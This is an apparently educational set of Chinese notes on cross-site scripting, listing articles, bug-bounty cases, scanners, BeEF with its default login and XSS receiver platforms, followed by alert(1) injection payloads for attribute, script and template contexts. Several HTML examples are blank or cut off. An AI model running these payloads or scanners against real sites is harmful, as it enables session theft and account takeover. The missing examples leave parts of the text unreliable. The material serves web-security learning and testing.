# XSS
---
## 免责声明
`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`
---
**相关文章**
- [XSS 插入绕过一些方式总结](https://blog.csdn.net/qq_29277155/article/details/51320064)
- [XSS 总结](https://xz.aliyun.com/t/4067)
- [WAF的 XSS 绕过姿势](https://ha.cker.in/Article/6239)
- [他山之石 | 对 XSS 的一次深入分析认识](https://www.freebuf.com/articles/web/195507.html)
- [minimaxir/big-list-of-naughty-strings](https://github.com/minimaxir/big-list-of-naughty-strings)
- [深入理解浏览器解析机制和 XSS 向量编码](http://bobao.360.cn/learning/detail/292.html)
- [csp 与 bypass 的探讨(译文)](http://wutongyu.info/csp-2015/)
- [XSS绕过某盾](https://xz.aliyun.com/t/6652)
- [xss编码绕过原理以及从中学习到的几个例子](https://0verwatch.top/xss-encodeorder.html)
- [探索XSS利用编码绕过的原理](https://saucer-man.com/information_security/103.html)
- [通过XSS窃取localStorage中的JWT](http://www.arkteam.net/?p=4453)
- [坑死我的HTTPOnly](http://gv7.me/articles/2017/Session-Cookie-without-Secure-flag-set/)
- [WAF攻防实践(4)](https://mp.weixin.qq.com/s/AS1cpMqr1WkuoLmRld_p0w)
- [实战|通过恶意 pdf 执行 xss 漏洞](https://mp.weixin.qq.com/s/D1XFNR-4qg9GUkZeyMZsyw)
- [SVG based Stored XSS](https://prashantbhatkal2000.medium.com/svg-based-stored-xss-ee6e9b240dee)
- [XSS With Hoisting](https://brutelogic.com.br/blog/xss-with-hoisting/)
- [Paragraph Separator(U+2029) XSS](https://www.hahwul.com/2022/02/06/u-2029-xss/)
**相关案例**
- [BugBounty:Twitter 蠕虫 XSS](https://xz.aliyun.com/t/5050)
- [T00LS帖子正文XSS](https://www.hackersb.cn/hacker/235.html)
- [The adventures of xss vectors in curious places](https://github.com/Dliv3/Venom)
- [Avast 杀毒软件中 5000 美元的 XSS 漏洞](https://nosec.org/home/detail/3118.html)
- [组合拳出击-Self型XSS变废为宝](https://gh0st.cn/archives/2018-08-28/1)
- [Reflected XSS in graph.facebook.com leads to account takeover in IE/Edge](https://ysamm.com/?p=343)
- [XSS attacks on Googlebot allow search index manipulation](https://www.tomanthony.co.uk/blog/xss-attacks-googlebot-index-manipulation/)
- [挖洞经验 | 看我如何发现亚马逊网站的反射型XSS漏洞](https://www.freebuf.com/articles/web/175606.html)
- [How I alert(1) in Azure DevOps](https://5alt.me/2019/02/xss-in-azure-devops/)
- [Stored XSS to Organisation Takeover](https://infosecwriteups.com/stored-xss-to-organisation-takeover-6eaaa2fdcd5b)
- [[BugBounty] XSS with Markdown — Exploit & Fix on OpenSource](https://lethanhphuc-pk.medium.com/bugbounty-xss-with-markdown-exploit-fix-on-opensource-1baecebe9645) - markdown xss 案例
- [BountyHunterInChina/重生之我是赏金猎人(五)-多手法绕过WAF挖掘某知名厂商XSS.pdf](https://github.com/J0o1ey/BountyHunterInChina/blob/main/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA(%E4%BA%94)-%E5%A4%9A%E6%89%8B%E6%B3%95%E7%BB%95%E8%BF%87WAF%E6%8C%96%E6%8E%98%E6%9F%90%E7%9F%A5%E5%90%8D%E5%8E%82%E5%95%86XSS.pdf)
- [BountyHunterInChina/重生之我是赏金猎人(七)-看我如何从FUZZ到XSS在SRC官网偷走你的个人信息.pdf](https://github.com/J0o1ey/BountyHunterInChina/blob/main/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA(%E4%B8%83)-%E7%9C%8B%E6%88%91%E5%A6%82%E4%BD%95%E4%BB%8EFUZZ%E5%88%B0XSS%E5%9C%A8SRC%E5%AE%98%E7%BD%91%E5%81%B7%E8%B5%B0%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF.pdf)
**相关工具**
- [s0md3v/XSStrike](https://github.com/s0md3v/XSStrike) - XSS 检测工具,效果一般
    - 依赖安装
        ```bash
        pip3 install -r requirements.txt
        wget https://github.com/mozilla/geckodriver/releases/download/v0.24.0/geckodriver-v0.24.0-linux64.tar.gz
        mkdir /usr/local/temp
        mv geckodriver /usr/local/temp
        PATH=$PATH:/usr/local/temp/
        ```
    - [Usage](https://github.com/s0md3v/XSStrike/wiki/Usage#scan-a-single-url)
        ```bash
        python3 xsstrike.py -u "http://example.com/search.php?q=query"
        python3 xsstrike.py -u "http://example.com/search.php?q=query" --fuzzer
        python3 xsstrike.py -u "http://example.com/search.php?q=query" --crawl
        ```
- [faizann24/XssPy](https://github.com/faizann24/XssPy) - Web 应用 XSS 扫描器
- [XSS Fuzzer](https://xssfuzzer.com/fuzzer.html) - payload 生成器
- [hahwul/dalfox](https://github.com/hahwul/dalfox) - 一款基于 Golang 开发的 XSS 参数分析和扫描工具
    ```bash
    cp dalfox /usr/bin/
    chmod +x /usr/bin/dalfox
    dalfox url http://testphp.vulnweb.com/listproducts.php\?cat\=123\&artist\=123\&asdf\=ff
    dalfox url http://testphp.vulnweb.com/listproducts.php\?cat\=123\&artist\=123\&asdf\=ff -b https://hahwul.xss.ht    # 单一目标模式
    dalfox file url.txt # 多目标模式，从文件读取扫描目标
    cat urls_file | dalfox pipe -H "AuthToken: bbadsfkasdfadsf87"   # 管道模式
    echo "vulnweb.com" | waybackurls | grep "=" | dalfox pipe -b https://hahwul.xss.ht
    ```
**xss 平台**
- **开源平台**
    - [firesunCN/BlueLotus_XSSReceiver](https://github.com/firesunCN/BlueLotus_XSSReceiver) - XSS 平台 CTF 工具 Web 安全工具
    - [keyus/xss](https://github.com/keyus/xss) - php 写的个人研究测试用的 xss cookie 攻击管理平台
    - [ssl/ezXSS](https://github.com/ssl/ezXSS) - ezXSS is an easy way for penetration testers and bug bounty hunters to test (blind) Cross Site Scripting.
- **在线平台**
    - http://xssye.com/index.php
- **beef**
    - 相关文章
        - [浏览器攻击框架 BeEF Part 1](https://www.freebuf.com/articles/web/175755.html)
        - [浏览器攻击框架 BeEF Part 2:初始化控制](https://www.freebuf.com/articles/web/176139.html)
        - [浏览器攻击框架 BeEF Part 3:持续控制](https://www.freebuf.com/articles/web/176550.html)
        - [浏览器攻击框架 BeEF Part 4:绕过同源策略与浏览器代理](https://www.freebuf.com/articles/web/176873.html)
        - [浏览器攻击框架 BeEF Part 5:Web应用及网络攻击测试](https://www.freebuf.com/articles/web/176912.html)
        默认端口为 3000,默认路径是`/ui/authentication`,默认用户名和密码 beef
**在线测试**
- http://demo.testfire.net/
- https://juice-shop.herokuapp.com/#/search
- https://xsschop.chaitin.cn/demo/
**靶场**
- [XSS 挑战-WalkThrough](../靶场/XSS挑战-WalkThrough.md)
**payload**
- [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
- [masatokinugawa/filterbypass](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet)
- [bugbounty-cheatsheet/cheatsheets/xss.md](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md)
- [aurebesh.js - Translate JavaScript to Other Writing Systems](https://aem1k.com/aurebesh.js/)
- [cujanovic/Markdown-XSS-Payloads](https://github.com/cujanovic/Markdown-XSS-Payloads) - XSS payloads for exploiting Markdown syntax
**Tips**
- **Firefox 关闭 xss 过滤器**
    about:config 把 rowser.urlbar.filter.javascript 改为 false
- **chrome 关闭 xss 过滤器**
    带参数启动 --args --disable-xss-auditor
---
## 基础
### 什么是 XSS
跨站点脚本 (XSS) 攻击是一种注入，Web 程序代码中对用户提交的参数未做过滤或过滤不严，导致参数中的特殊字符破坏了 HTML 页面的原有逻辑，攻击者可以利用该漏洞执行恶意 HTML/JS 代码、构造蠕虫、篡改页面实施钓鱼攻击、以及诱导用户再次登录，然后获取其登录凭证等。
XSS 攻击有 3 种类型：
- 反射型 XSS : 通过网络浏览器从另一个网站运行恶意脚本的攻击
- 存储型 XSS : 存储型是将注入的脚本永久存储在目标服务器上的攻击
- 基于DOM的XSS : 一种在 DOM 结构中而不是在 HTML 代码中触发的 XSS。
### XSS Payload
#### 最基础的
```html
```
#### 在标签内部的
```html
" onmouseover=alert(1)
" autofocus onfocus=alert(1)
">
'>
">
```
示例1
```html
```
示例2
```html
```
示例3
```html
1
">1
```
示例4
```html
';
```
**通过注释转义的**
```html
-->
 -->
```
**在 script 中**
```js
'-alert(1)-'
'/alert(1)//
```
示例
```html
```
**在 script 中,但输出在字符串分隔值内，引号被反斜杠转义**
```js
\'alert(1)//
```
示例
```html
```
**一行 JS 内多个值**
```js
/alert(1)//\
/alert(1)}//\
```
示例
```html
```
**条件控制语句内的值**
```js
'}alert(1);{'
\'}alert(1);{//
```
示例
```html
    var greeting;
    var time = 1;
    if (time 
    var test;
    var time = 1;
    if (time 
```
**反引号内的值**
```js
${alert(1)}
```